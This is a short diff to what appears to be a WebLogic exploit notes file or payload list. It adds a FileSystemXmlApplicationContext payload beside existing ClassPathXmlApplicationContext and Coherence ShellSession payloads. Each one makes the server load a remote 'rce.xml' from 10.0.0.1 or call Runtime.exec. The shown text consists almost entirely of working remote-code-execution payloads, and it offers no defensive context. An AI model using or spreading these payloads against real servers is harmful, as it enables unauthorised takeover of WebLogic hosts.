@@ -98,6 +98,12 @@ com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exe
 com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://10.0.0.1/rce.xml")
 ```
 ###
+###
+```
+com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://10.0.0.1/rce.xml")
+```
+###
+###
 rce.xml
 ```
 <?xml version="1.0" encoding="UTF-8" ?>
